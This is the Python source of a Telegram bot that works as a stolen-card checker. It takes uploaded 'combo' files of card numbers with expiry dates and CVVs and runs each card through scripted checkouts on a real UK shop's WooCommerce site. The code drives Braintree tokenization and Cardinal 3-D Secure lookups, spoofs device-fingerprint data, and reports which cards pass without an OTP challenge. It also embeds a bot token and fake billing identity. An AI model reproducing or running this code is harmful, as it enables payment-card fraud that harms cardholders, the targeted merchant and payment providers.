import requests
import telebot
from telebot import types
import telebot,os
import time
import re
import base64
import user_agent
from getuseragent import UserAgent
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
import webbrowser
channel_link = 'https://t.me/+1I4169AHJqs4NGZk'
webbrowser.open(channel_link)
video_url = 'https://t.me/mmmeoa/59'
admin = 7137477686
token = "7529238194:AAGtgtEJAdtSc6DaMgxiOPocdkvLXmv_V0w"
bot=telebot.TeleBot(token,parse_mode="HTML")
@bot.message_handler(commands=["start"])
def start(message):
    keyboard = types.InlineKeyboardMarkup()
    cmds_button = types.InlineKeyboardButton(text="𝐂𝐌𝐃𝐒", callback_data="cmds")
    keyboard.add(cmds_button)
    bot.send_video(
        message.chat.id,
        video=video_url,
        caption="🤖 hi for bot otp",
        reply_markup=keyboard
    )
@bot.callback_query_handler(func=lambda call: call.data == 'cmds')
def cmds_callback(call):
    keyboard = types.InlineKeyboardMarkup()
    keyboard.row_width = 2
    keyboard.add(
        types.InlineKeyboardButton("𝐂𝐇𝐀𝐍𝐍𝐄𝐋", url="https://t.me/amiroux_ff"),
        types.InlineKeyboardButton("𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑", url="https://t.me/nkmok")
    )

    try:
        bot.edit_message_caption(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            caption=f'''<b> 

━━━━━━━━━━━━━━━━━━━━━━━━

ابعت كومبو وهيفحص تلقائي


━━━━━━━━━━━━━━━━━━━━━━━━</b>''',
            parse_mode='HTML',
            reply_markup=keyboard
        )
    except Exception as e:
        print(f"An error occurred: {e}")


import re,requests
def brn(ccx):
	ccx=ccx.strip()
	c = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
			yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
	r = requests.Session()

	from requests_toolbelt.multipart.encoder import MultipartEncoder
	data = MultipartEncoder({
	'quantity': (None, '1'),
    'add-to-cart': (None, '1203'),
})
	
	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': data.content_type,
    'origin': 'https://www.woodbridgegreengrocers.co.uk',
    'priority': 'u=0, i',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/product/strawberries-dutch/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.post(
	    'https://www.woodbridgegreengrocers.co.uk/product/strawberries-dutch/',
	    headers=headers,
	    data=data,
	)


	headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'priority': 'u=0, i',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/basket/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}
	
	response = r.get(
	    'https://www.woodbridgegreengrocers.co.uk/checkout/',
	    headers=headers,
	)
	ccli = re.search(r'client_token_nonce":"([^"]+)"', response.text).group(1)
	sec = re.search(r'update_order_review_nonce":"(.*?)"', response.text).group(1)
	
	check = re.search(r'name="woocommerce-process-checkout-nonce" value="(.*?)"', response.text).group(1)
	headers = {
		'accept': '*/*',
		'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
		'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		'origin': 'https://www.woodbridgegreengrocers.co.uk',
		'priority': 'u=1, i',
		'referer': 'https://www.woodbridgegreengrocers.co.uk/checkout/',
		'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
		'sec-ch-ua-mobile': '?0',
		'sec-ch-ua-platform': '"Windows"',
		'sec-fetch-dest': 'empty',
		'sec-fetch-mode': 'cors',
		'sec-fetch-site': 'same-origin',
		'user-agent': user,
		'x-requested-with': 'XMLHttpRequest',
	}

	params = {
		'wc-ajax': 'update_order_review',
	}

	data = f'security={sec}&payment_method=braintree_credit_card&country=GB&state=NY&postcode=L18+1HG&city=Raleigh&address=1981+Jennifer+Lane&address_2=&s_country=GB&s_state=NY&s_postcode=L18+1HG&s_city=Raleigh&s_address=1981+Jennifer+Lane&s_address_2=&has_full_address=true&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Fwww.woodbridgegreengrocers.co.uk%252F%26wc_order_attribution_session_start_time%3D2024-12-18%252022%253A26%253A22%26wc_order_attribution_session_pages%3D20%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3DMozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F131.0.0.0%2520Safari%252F537.36%26woocommerce_delivery_date_field%3D2024-12-20%26new_order_notes%3D%26billing_first_name%3D%26billing_last_name%3D%26billing_company%3D%26billing_country%3DGB%26billing_address_1%3D1981%2520Jennifer%2520Lane%26billing_address_2%3D%26billing_city%3DRaleigh%26billing_state%3DNY%26billing_postcode%3DL18%25201HG%26billing_phone%3D%26billing_email%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3DGB%26shipping_address_1%3D1981%2520Jennifer%2520Lane%26shipping_address_2%3D%26shipping_city%3DRaleigh%26shipping_state%3DNY%26shipping_postcode%3DL18%25201HG%26shipping_method%255B0%255D%3Dlocal_pickup%253A6%26payment_method%3Dbraintree_credit_card%26wc-braintree-credit-card-card-type%3D%26wc-braintree-credit-card-3d-secure-enabled%3D%26wc-braintree-credit-card-3d-secure-verified%3D%26wc-braintree-credit-card-3d-secure-order-total%3D5.49%26wc_braintree_credit_card_payment_nonce%3D%26wc_braintree_device_data%3D%26woocommerce-process-checkout-nonce%3D0{check}%26_wp_http_referer%3D%252Fcheckout%252F&shipping_method%5B0%5D=local_pickup%3A6'

	response = r.post('https://www.woodbridgegreengrocers.co.uk/', params=params, headers=headers, data=data)

	
	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://www.woodbridgegreengrocers.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/checkout/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	data = {
    'action': 'wc_braintree_credit_card_get_client_token',
    'nonce': ccli,
}

	response = r.post(
    'https://www.woodbridgegreengrocers.co.uk/wp-admin/admin-ajax.php',
    headers=headers,
    data=data,
)

	enc = response.json()['data']
	dec = base64.b64decode(enc).decode('utf-8')
	au=re.findall(r'"authorizationFingerprint":"(.*?)"',dec)[0]
	

	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://www.woodbridgegreengrocers.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '6bb45a95-9660-417f-ad88-a0e0e2843296',
    },
    'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     kount {       merchantId     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     paypal {       displayName       clientId       privacyUrl       userAgreementUrl       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment     }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
    'operationName': 'ClientConfiguration',
}

	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

	cardnal=response.json()['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']

	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json;charset=UTF-8',
    'origin': 'https://www.woodbridgegreengrocers.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
    'x-cardinal-tid': 'Tid-87623040-ee4b-404f-a698-239891817400',
	}
	
	json_data = {
    'BrowserPayload': {
        'Order': {
            'OrderDetails': {},
            'Consumer': {
                'BillingAddress': {},
                'ShippingAddress': {},
                'Account': {},
            },
            'Cart': [],
            'Token': {},
            'Authorization': {},
            'Options': {},
            'CCAExtension': {},
        },
        'SupportsAlternativePayments': {
            'cca': True,
            'hostedFields': False,
            'applepay': False,
            'discoverwallet': False,
            'wallet': False,
            'paypal': False,
            'visacheckout': False,
        },
    },
    'Client': {
        'Agent': 'SongbirdJS',
        'Version': '1.35.0',
    },
    'ConsumerSessionId': '0_da0f4701-c819-464e-9c48-2dbacfa8cce2',
    'ServerJWT': cardnal,
}

	
	response = r.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data)
	

	payload = response.json()['CardinalJWT']
	payload_dict = jwt.decode(payload, options={"verify_signature": False})
	reference_id = payload_dict['ReferenceId']


	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://geo.cardinalcommerce.com',
    'priority': 'u=1, i',
    'referer': 'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=602c62ec287c36651cb3cbcd&tmEventType=PAYMENT&referenceId=0_da0f4701-c819-464e-9c48-2dbacfa8cce2&geolocation=false&origin=Songbird',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
    'x-requested-with': 'XMLHttpRequest',
}

	
	json_data = {
    'Cookies': {
        'Legacy': True,
        'LocalStorage': True,
        'SessionStorage': True,
    },
    'DeviceChannel': 'Browser',
    'Extended': {
        'Browser': {
            'Adblock': True,
            'AvailableJsFonts': [],
            'DoNotTrack': 'unknown',
            'JavaEnabled': False,
        },
        'Device': {
            'ColorDepth': 24,
            'Cpu': 'unknown',
            'Platform': 'Win32',
            'TouchSupport': {
                'MaxTouchPoints': 0,
                'OnTouchStartAvailable': False,
                'TouchEventCreationSuccessful': False,
            },
        },
    },
    'Fingerprint': 'df04c62228dcbf583e248f0e275f260e',
    'FingerprintingTime': 2524,
    'FingerprintDetails': {
        'Version': '1.5.1',
    },
    'Language': 'ar',
    'Latitude': None,
    'Longitude': None,
    'OrgUnitId': '602c62ec287c36651cb3cbcd',
    'Origin': 'Songbird',
    'Plugins': [
        'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'Chrome PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
        'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
    ],
    'ReferenceId': reference_id,
    'Referrer': 'https://www.woodbridgegreengrocers.co.uk/',
    'Screen': {
        'FakedResolution': False,
        'Ratio': 1.7786458333333333,
        'Resolution': '1366x768',
        'UsableResolution': '1366x728',
        'CCAScreenSize': '02',
    },
    'CallSignEnabled': None,
    'ThreatMetrixEnabled': False,
    'ThreatMetrixEventType': 'PAYMENT',
    'ThreatMetrixAlias': 'Default',
    'TimeOffset': -120,
    'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
    'UserAgentDetails': {
        'FakedOS': False,
        'FakedBrowser': False,
    },
    'BinSessionId': '5b6d4d7e-22e5-48c2-adbe-dbf491a6e516',
}

	
	response = r.post(
		'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
		headers=headers,
		json=json_data,
	)

	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'authorization': f'Bearer {au}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
	
	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '6bb45a95-9660-417f-ad88-a0e0e2843296',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}
	
	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	headers = {
    'accept': '*/*',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://www.woodbridgegreengrocers.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://www.woodbridgegreengrocers.co.uk/',
    'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}
		
	json_data = {
    'amount': '5.49',
    'additionalInfo': {
        'billingLine1': '1981 Jennifer Lane',
        'billingLine2': '',
        'billingCity': 'Raleigh',
        'billingState': 'NY',
        'billingPostalCode': 'L18 1HG',
        'billingCountryCode': 'GB',
        'billingPhoneNumber': '+20919515762',
        'billingGivenName': 'Christa',
        'billingSurname': 'afadf',
        'email': 'adfeaqfa@gmail.com',
    },
    'bin': '511558',
    'dfReferenceId': reference_id,
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.94.0',
        'cardinalDeviceDataCollectionTimeElapsed': 94,
        'issuerDeviceDataCollectionTimeElapsed': 232,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': au,
    'braintreeLibraryVersion': 'braintree/web/3.94.0',
    '_meta': {
        'merchantAppId': 'www.woodbridgegreengrocers.co.uk',
        'platform': 'web',
        'sdkVersion': '3.94.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '6bb45a95-9660-417f-ad88-a0e0e2843296',
    },
}

		
	response = r.post(
			f'https://api.braintreegateway.com/merchants/drd5rqgkw6wtc55x/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
			headers=headers,
			json=json_data,
		)


	vbv = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]
	
	if 'authenticate_successful' in vbv:
	       return '3DS Authenticate Successful ✅ '
	elif 'challenge_required' in vbv:
	       return '3DS Challenge Required ❌'
	elif 'authenticate_attempt_successful' in vbv:
	       return '3DS Authenticate Attempt Successful ✅'
	elif 'authenticate_rejected' in vbv:
	       return '3DS Authenticate Rejected ❌'
	elif 'authenticate_frictionless_failed' in vbv:
	       return '3DS Authenticate Frictionless Failed ❌'
	elif 'lookup_card_error' in vbv:
	       return 'lookup_card_error ⚠️'
	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	
@bot.message_handler(content_types=["document"])
def main(message):
	dd = 0
	ch = 0
	last = 0
	ko = (bot.reply_to(message, "𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛").message_id)
	ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
	with open("combo.txt", "wb") as w:
		w.write(ee)
	try:
		with open("combo.txt", 'r') as file:
			lino = file.readlines()
			total = len(lino)
			for cc in lino:
			
				try:
				    data = requests.get(f'https://lookup.binlist.net/{cc[:6]}').json()
				    bank = data.get('bank', {}).get('name', 'non')
				    country_flag = data.get('country', {}).get('emoji', 'Non')
				    country = data.get('country', {}).get('name', 'non')
				    brand = data.get('scheme', 'non')
				    card_type = data.get('type', 'non')
				    url = data.get('bank', {}).get('url', 'non')
				except Exception:
					bank = country_flag = country = brand = card_type = url = 'non'
				try:
					last = str(brn(cc))
				except Exception as e:
					print(e)
				mes = types.InlineKeyboardMarkup(row_width=1)
				mero = types.InlineKeyboardButton(f"{last}", callback_data='u8')
				cm1 = types.InlineKeyboardButton(f"{cc}", callback_data='u8')
				cm2 = types.InlineKeyboardButton(f"𝗢𝘁𝗽 ⛔ {ch}", callback_data='x')
				cm3 = types.InlineKeyboardButton(f"𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ {dd}", callback_data='x')
				stop = types.InlineKeyboardButton(f"𝐒𝐓𝐎𝐏 ⚠️ ", callback_data='u8')
				mes.add(mero,cm1, cm2, cm3 ,stop)
				bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐂𝐇𝐄𝐂𝐊𝐈𝐍𝐆 𝐘𝐎𝐔𝐑 𝐂𝐀𝐑𝐃𝐒...⌛''', reply_markup=mes)
				
				msgs = f'''𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌ 
[↯] 𝗖𝗖 ⇾ {cc} 
[↯] 𝗚𝗔𝗧𝗘𝗦 ⇾ 𝟯𝗗 𝗟𝗼𝗼𝗸𝗨𝗣
[↯] 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 →{last}
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗜𝗡 → {cc[:6]} - {card_type} - {brand} 
[↯] 𝗕𝗮𝗻𝗸  → {bank} 
[↯] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 → {country} - {country_flag} 
━━━━━━━━━━━━━━━━
[↯] 𝗕𝗼𝘁 𝗕𝘆 ⇾ 『@nkmok』'''



				
				if '3DS Challenge Required ❌' in last:
					ch += 1
					key = types.InlineKeyboardMarkup();bot.send_message(message.chat.id, f"<strong>{msgs}</strong>",parse_mode="html",reply_markup=key)
				else:
					dd += 1
					time.sleep(9)
	except:
		pass
print("تم تشغيل البوت")
bot.polling()
